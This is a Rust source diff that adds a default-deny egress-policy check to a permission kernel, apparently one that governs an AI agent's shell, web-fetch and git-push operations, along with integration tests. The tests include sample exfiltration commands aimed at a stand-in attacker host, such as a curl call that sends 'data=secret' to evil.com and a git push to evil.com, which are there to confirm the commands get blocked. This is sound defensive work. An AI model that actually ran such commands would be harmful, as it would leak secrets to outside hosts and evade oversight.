@@ -204,6 +204,17 @@ pub enum DenyReason {
         /// The isolation dimension that blocks this operation.
         dimension: String,
     },
+    /// Operation denied by egress policy.
+    ///
+    /// The operation would contact a host not permitted by the egress policy
+    /// (`.nucleus/egress.toml`). The message includes the blocked host and
+    /// the policy's allowed hosts for actionable remediation.
+    EgressBlocked {
+        /// The host that was blocked.
+        host: String,
+        /// Human-readable reason from the egress policy.
+        policy_reason: String,
+    },
     /// Information flow control violation.
     ///
     /// The session's accumulated IFC label violates a flow enforcement rule.
@@ -359,6 +370,13 @@ pub struct Kernel {
     /// Must be declared before the session starts (monotonicity of rule set).
     /// Each application produces an audit entry in the trace.
     declassification_rules: Vec<portcullis_core::declassify::DeclassificationRule>,
+    /// Optional egress policy — when present, operations that contact the
+    /// network are checked against the allowed/denied host lists.
+    ///
+    /// Loaded from `.nucleus/egress.toml`. When `None`, no egress filtering
+    /// is applied (all hosts are allowed).
+    #[cfg(feature = "spec")]
+    egress_policy: Option<crate::egress_policy::EgressPolicy>,
     /// Optional Ed25519 signing key for receipt signing.
     ///
     /// When present, `decide_with_parents()` produces signed receipts
@@ -401,6 +419,8 @@ impl Kernel {
             flow_label: None,
             flow_graph: None,
             declassification_rules: Vec::new(),
+            #[cfg(feature = "spec")]
+            egress_policy: None,
             #[cfg(feature = "crypto")]
             signing_key: None,
         }
@@ -642,6 +662,8 @@ impl Kernel {
             flow_label: None,
             flow_graph: None,
             declassification_rules: Vec::new(),
+            #[cfg(feature = "spec")]
+            egress_policy: None,
             #[cfg(feature = "crypto")]
             signing_key: None,
         }
@@ -678,6 +700,8 @@ impl Kernel {
             flow_label: None,
             flow_graph: None,
             declassification_rules: Vec::new(),
+            #[cfg(feature = "spec")]
+            egress_policy: None,
             #[cfg(feature = "crypto")]
             signing_key: None,
         }
@@ -802,6 +826,31 @@ impl Kernel {
                 false,
                 false,
             );
+        }
+
+        // 3c. Egress policy check — host-level filtering for network operations.
+        //
+        // When an egress policy is loaded, operations that contact the network
+        // are checked against the allowed/denied host lists. Default-deny:
+        // any host not in the allowlist is blocked.
+        //
+        // For RunBash: extract destinations from the command string.
+        // For WebFetch: extract host from the URL subject.
+        // For GitPush/CreatePr: extract host from the remote URL subject.
+        #[cfg(feature = "spec")]
+        if let Some(ref egress) = self.egress_policy {
+            if let Some(denial) = check_egress(operation, subject, egress) {
+                return self.record_with_exposure(
+                    operation,
+                    subject,
+                    Verdict::Deny(denial),
+                    &pre_hash,
+                    pre_exposure_count,
+                    contributed_label,
+                    false,
+                    false,
+                );
+            }
         }
 
         // 4. Path check (for file operations)
@@ -1063,6 +1112,25 @@ impl Kernel {
         );
     }
 
+    /// Set the egress policy for this session.
+    ///
+    /// When set, operations that contact the network (RunBash with network
+    /// commands, WebFetch, GitPush, CreatePr) are checked against the
+    /// allowed/denied host patterns. Default-deny: unlisted hosts are blocked.
+    ///
+    /// Must be called before the first `decide()` — egress policy is
+    /// immutable for the session lifetime (like isolation level).
+    #[cfg(feature = "spec")]
+    pub fn set_egress_policy(&mut self, policy: crate::egress_policy::EgressPolicy) {
+        self.egress_policy = Some(policy);
+    }
+
+    /// Get the egress policy, if set.
+    #[cfg(feature = "spec")]
+    pub fn egress_policy(&self) -> Option<&crate::egress_policy::EgressPolicy> {
+        self.egress_policy.as_ref()
+    }
+
     /// Get the append-only session trace.
     pub fn trace(&self) -> &[Decision] {
         &self.trace
@@ -1247,6 +1315,149 @@ fn is_exfil_operation(op: Operation) -> bool {
         op,
         Operation::RunBash | Operation::GitPush | Operation::CreatePr | Operation::SpawnAgent
     )
+}
+
+/// Check an operation against the egress policy, returning a `DenyReason` if blocked.
+///
+/// Returns `None` when no egress violation is found (either the operation doesn't
+/// involve network egress, or all extracted destinations are allowed).
+///
+/// For `RunBash`, extracts destinations from the command string using
+/// [`crate::egress_extract::extract_egress_destinations`].
+/// For `WebFetch`/`WebSearch`, extracts the host from the URL subject.
+/// For `GitPush`/`CreatePr`, extracts the host from the remote URL subject.
+#[cfg(feature = "spec")]
+fn check_egress(
+    operation: Operation,
+    subject: &str,
+    policy: &crate::egress_policy::EgressPolicy,
+) -> Option<DenyReason> {
+    use crate::egress_extract::extract_egress_destinations;
+    use crate::egress_policy::EgressVerdict;
+
+    /// Format the allowlist as a human-readable hint for denial messages.
+    fn format_allowed_hint(policy: &crate::egress_policy::EgressPolicy) -> String {
+        if policy.allowed_hosts.is_empty() {
+            return "no hosts are allowed (empty allowlist)".to_string();
+        }
+        let hosts: Vec<String> = policy
+            .allowed_hosts
+            .iter()
+            .take(5)
+            .map(|h| h.to_string())
+            .collect();
+        let suffix = if policy.allowed_hosts.len() > 5 {
+            format!(", ... ({} more)", policy.allowed_hosts.len() - 5)
+        } else {
+            String::new()
+        };
+        format!("allowed hosts: {}{}", hosts.join(", "), suffix)
+    }
+
+    match operation {
+        Operation::RunBash => {
+            // Extract all network destinations from the bash command.
+            let destinations = extract_egress_destinations(subject);
+            for dest in &destinations {
+                if let EgressVerdict::Deny { reason } = policy.check_host(&dest.host) {
+                    return Some(DenyReason::EgressBlocked {
+                        host: dest.host.clone(),
+                        policy_reason: format!(
+                            "Blocked: network access to '{}' denied by egress policy ({} via {}). {}",
+                            dest.host,
+                            reason,
+                            dest.command,
+                            format_allowed_hint(policy),
+                        ),
+                    });
+                }
+            }
+            None
+        }
+        Operation::WebFetch | Operation::WebSearch => {
+            // Subject is the URL — extract host.
+            let host = extract_host_from_subject(subject)?;
+            if let EgressVerdict::Deny { reason } = policy.check_host(&host) {
+                Some(DenyReason::EgressBlocked {
+                    host: host.clone(),
+                    policy_reason: format!(
+                        "Blocked: network access to '{host}' denied by egress policy ({reason}). {}",
+                        format_allowed_hint(policy),
+                    ),
+                })
+            } else {
+                None
+            }
+        }
+        Operation::GitPush | Operation::CreatePr => {
+            // Subject may be a remote URL or "origin/main" style ref.
+            // Try to extract a host from it.
+            let host = extract_host_from_subject(subject)?;
+            if let EgressVerdict::Deny { reason } = policy.check_host(&host) {
+                Some(DenyReason::EgressBlocked {
+                    host: host.clone(),
+                    policy_reason: format!(
+                        "Blocked: network access to '{host}' denied by egress policy ({reason}). {}",
+                        format_allowed_hint(policy),
+                    ),
+                })
+            } else {
+                None
+            }
+        }
+        _ => None,
+    }
+}
+
+/// Extract a hostname from a URL-like subject string.
+///
+/// Handles: `https://host/path`, `http://host:port/path`, `git@host:org/repo.git`,
+/// and bare `hostname` strings (if they contain a dot).
+#[cfg(feature = "spec")]
+fn extract_host_from_subject(subject: &str) -> Option<String> {
+    let trimmed = subject.trim();
+
+    // Handle scheme://authority/path
+    if let Some(rest) = trimmed
+        .strip_prefix("https://")
+        .or_else(|| trimmed.strip_prefix("http://"))
+        .or_else(|| trimmed.strip_prefix("ftp://"))
+    {
+        let authority = rest.split('/').next()?;
+        let host_port = authority.split('@').next_back()?;
+        let host = if host_port.starts_with('[') {
+            // IPv6: [::1]:8080
+            host_port
+                .find(']')
+                .map(|end| &host_port[1..end])?
+                .to_string()
+        } else {
+            // Strip port if present
+            host_port
+                .rsplit_once(':')
+                .and_then(|(h, p)| p.parse::<u16>().ok().map(|_| h))
+                .unwrap_or(host_port)
+                .to_string()
+        };
+        return Some(host);
+    }
+
+    // Handle git@host:path SSH format
+    if let Some(after_at) = trimmed.strip_prefix("git@") {
+        let host = after_at.split(':').next()?;
+        if !host.is_empty() {
+            return Some(host.to_string());
+        }
+    }
+
+    // Bare hostname with dots (e.g., "github.com" from "github.com:org/repo")
+    let first_part = trimmed.split(':').next().unwrap_or(trimmed);
+    let first_part = first_part.split('/').next().unwrap_or(first_part);
+    if first_part.contains('.') && !first_part.starts_with('-') {
+        return Some(first_part.to_string());
+    }
+
+    None
 }
 
 #[cfg(test)]
@@ -2601,5 +2812,199 @@ mod tests {
             "Declassified tool response should allow write, got {:?}",
             d.verdict
         );
+    }
+
+    // ── Egress policy integration tests ────────────────────────────────
+
+    #[cfg(feature = "spec")]
+    mod egress_tests {
+        use super::*;
+        use crate::command::CommandLattice;
+        use crate::egress_policy::EgressPolicy;
+
+        /// Build a kernel that has all capabilities enabled and no command
+        /// restrictions — isolating just the egress policy check.
+        ///
+        /// Pre-grants approvals for all egress-capable operations so the
+        /// uninhabitable_state constraint doesn't interfere with egress policy tests.
+        fn kernel_with_egress(toml: &str) -> Kernel {
+            let policy = EgressPolicy::from_toml(toml).unwrap();
+            let mut perms = PermissionLattice::permissive();
+            perms.commands = CommandLattice::permissive();
+            let mut kernel = Kernel::new(perms);
+            kernel.set_egress_policy(policy);
+            // Pre-grant approvals so uninhabitable_state gating doesn't mask egress denials
+            kernel.grant_approval(Operation::RunBash, 100);
+            kernel.grant_approval(Operation::GitPush, 100);
+            kernel.grant_approval(Operation::CreatePr, 100);
+            kernel.grant_approval(Operation::WebFetch, 100);
+            kernel.grant_approval(Operation::WebSearch, 100);
+            kernel.grant_approval(Operation::SpawnAgent, 100);
+            kernel
+        }
+
+        #[test]
+        fn bash_curl_to_denied_host_is_blocked() {
+            let mut kernel = kernel_with_egress(r#"allowed_hosts = ["*.github.com", "crates.io"]"#);
+            let (d, token) = kernel.decide(
+                Operation::RunBash,
+                "curl https://evil.com/exfil?data=secret",
+            );
+            assert!(d.verdict.is_denied(), "expected deny, got {:?}", d.verdict);
+            assert!(token.is_none());
+            match &d.verdict {
+                Verdict::Deny(DenyReason::EgressBlocked {
+                    host,
+                    policy_reason,
+                }) => {
+                    assert_eq!(host, "evil.com");
+                    assert!(policy_reason.contains("evil.com"));
+                    assert!(policy_reason.contains("allowed hosts:"));
+                }
+                other => panic!("expected EgressBlocked, got {other:?}"),
+            }
+        }
+
+        #[test]
+        fn bash_curl_to_allowed_host_passes() {
+            let mut kernel = kernel_with_egress(r#"allowed_hosts = ["*.github.com", "crates.io"]"#);
+            let (d, token) = kernel.decide(Operation::RunBash, "curl https://api.github.com/repos");
+            assert!(
+                d.verdict.is_allowed(),
+                "expected allow, got {:?}",
+                d.verdict
+            );
+            assert!(token.is_some());
+        }
+
+        #[test]
+        fn bash_safe_command_no_egress_passes() {
+            let mut kernel = kernel_with_egress(r#"allowed_hosts = ["*.github.com"]"#);
+            let (d, _) = kernel.decide(Operation::RunBash, "cargo test --lib");
+            assert!(
+                d.verdict.is_allowed(),
+                "safe command should pass, got {:?}",
+                d.verdict
+            );
+        }
+
+        #[test]
+        fn web_fetch_denied_host() {
+            let mut kernel = kernel_with_egress(r#"allowed_hosts = ["*.github.com"]"#);
+            let (d, _) = kernel.decide(Operation::WebFetch, "https://evil.com/data");
+            assert!(d.verdict.is_denied());
+            match &d.verdict {
+                Verdict::Deny(DenyReason::EgressBlocked { host, .. }) => {
+                    assert_eq!(host, "evil.com");
+                }
+                other => panic!("expected EgressBlocked, got {other:?}"),
+            }
+        }
+
+        #[test]
+        fn web_fetch_allowed_host() {
+            let mut kernel = kernel_with_egress(r#"allowed_hosts = ["*.github.com"]"#);
+            let (d, token) = kernel.decide(Operation::WebFetch, "https://api.github.com/repos");
+            assert!(d.verdict.is_allowed());
+            assert!(token.is_some());
+        }
+
+        #[test]
+        fn git_push_denied_host() {
+            let mut kernel = kernel_with_egress(r#"allowed_hosts = ["github.com"]"#);
+            let (d, _) = kernel.decide(Operation::GitPush, "https://evil.com/org/repo.git");
+            assert!(d.verdict.is_denied());
+            match &d.verdict {
+                Verdict::Deny(DenyReason::EgressBlocked { host, .. }) => {
+                    assert_eq!(host, "evil.com");
+                }
+                other => panic!("expected EgressBlocked, got {other:?}"),
+            }
+        }
+
+        #[test]
+        fn git_push_allowed_host() {
+            let mut kernel = kernel_with_egress(r#"allowed_hosts = ["github.com"]"#);
+            let (d, token) = kernel.decide(Operation::GitPush, "https://github.com/org/repo.git");
+            assert!(d.verdict.is_allowed());
+            assert!(token.is_some());
+        }
+
+        #[test]
+        fn git_push_ssh_format_denied() {
+            let mut kernel = kernel_with_egress(r#"allowed_hosts = ["github.com"]"#);
+            let (d, _) = kernel.decide(Operation::GitPush, "git@evil.com:org/repo.git");
+            assert!(d.verdict.is_denied());
+            match &d.verdict {
+                Verdict::Deny(DenyReason::EgressBlocked { host, .. }) => {
+                    assert_eq!(host, "evil.com");
+                }
+                other => panic!("expected EgressBlocked, got {other:?}"),
+            }
+        }
+
+        #[test]
+        fn deny_list_overrides_wildcard_allow() {
+            let mut kernel = kernel_with_egress(
+                r#"
+allowed_hosts = ["*.github.com"]
+denied_hosts = ["evil.github.com"]
+"#,
+            );
+            // evil.github.com matches allow wildcard but deny takes priority
+            let (d, _) = kernel.decide(Operation::WebFetch, "https://evil.github.com/exfil");
+            assert!(d.verdict.is_denied());
+
+            // good.github.com is fine
+            let (d2, _) = kernel.decide(Operation::WebFetch, "https://good.github.com/data");
+            assert!(d2.verdict.is_allowed());
+        }
+
+        #[test]
+        fn no_egress_policy_allows_all() {
+            let mut perms = PermissionLattice::permissive();
+            perms.commands = CommandLattice::permissive();
+            let mut kernel = Kernel::new(perms);
+            kernel.grant_approval(Operation::WebFetch, 10);
+            // No egress policy set — should allow any host
+            let (d, _) = kernel.decide(Operation::WebFetch, "https://anything.com/data");
+            assert!(d.verdict.is_allowed());
+        }
+
+        #[test]
+        fn read_files_not_affected_by_egress() {
+            let mut kernel = kernel_with_egress(r#"allowed_hosts = []"#);
+            // Empty allowlist means all egress denied, but reads aren't egress
+            let (d, _) = kernel.decide(Operation::ReadFiles, "/workspace/main.rs");
+            assert!(d.verdict.is_allowed());
+        }
+
+        #[test]
+        fn bash_multiple_destinations_first_blocked() {
+            let mut kernel = kernel_with_egress(r#"allowed_hosts = ["b.com"]"#);
+            // Two destinations: a.com (blocked) then b.com (allowed)
+            let (d, _) =
+                kernel.decide(Operation::RunBash, "curl https://a.com; curl https://b.com");
+            assert!(
+                d.verdict.is_denied(),
+                "first blocked host should deny the whole command"
+            );
+            match &d.verdict {
+                Verdict::Deny(DenyReason::EgressBlocked { host, .. }) => {
+                    assert_eq!(host, "a.com");
+                }
+                other => panic!("expected EgressBlocked for a.com, got {other:?}"),
+            }
+        }
+
+        #[test]
+        fn egress_blocked_recorded_in_trace() {
+            let mut kernel = kernel_with_egress(r#"allowed_hosts = ["safe.com"]"#);
+            let trace_before = kernel.trace().len();
+            let _ = kernel.decide(Operation::WebFetch, "https://evil.com/data");
+            assert_eq!(kernel.trace().len(), trace_before + 1);
+            let entry = kernel.trace().last().unwrap();
+            assert!(entry.verdict.is_denied());
+        }
     }
 }
